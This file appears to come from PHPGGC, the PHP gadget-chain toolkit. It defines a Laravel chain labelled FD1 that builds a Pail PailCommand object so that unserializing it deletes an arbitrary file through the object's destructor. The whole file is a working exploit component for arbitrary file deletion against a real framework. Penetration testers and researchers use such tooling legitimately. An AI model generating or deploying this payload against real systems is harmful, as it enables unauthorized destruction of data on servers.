<?php

namespace GadgetChain\Laravel;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '*';
    public static $vector = '__destruct';
    public static $author = 'Maxime Rinaudo';
    public static $information = 'Deletes an arbitrary file in Laravel\'s Pail plugin';

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Laravel\Pail\Console\Commands\PailCommand($file);
    }
}
